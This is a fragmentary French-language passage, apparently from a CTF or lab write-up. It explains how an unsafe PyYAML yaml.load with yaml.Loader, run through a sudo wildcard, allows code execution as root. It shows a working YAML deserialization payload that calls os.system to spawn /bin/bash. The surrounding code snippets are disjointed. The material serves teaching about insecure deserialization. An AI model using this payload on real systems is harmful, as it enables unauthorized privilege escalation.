```bash
    token = request.headers.get("X-Auth-Token") or request.headers.get("Authorization", "")
```

```bash
        output = e.output.decode(errors="replace")
    except Exception as e:
        output = str(e)
```

```
Le script utilise la fonction vulnérable `yaml.load(contenido, Loader=yaml.Loader)` sur un fichier qu'on lui passez en argument
```

Le chargeur `yaml.Loader` dans PyYAML permet l'instanciation d'objets Python arbitraires via la désérialisation YAML. Comme nous pouvons spécifier le fichier de configuration de notre choix grâce au joker `*` de `sudo`, nous pouvons déclencher une **exécution de code arbitraire (RCE)** en tant que **root**.

```bash
> !!python/object/apply:os.system
> - "/bin/bash"
> EOF
```
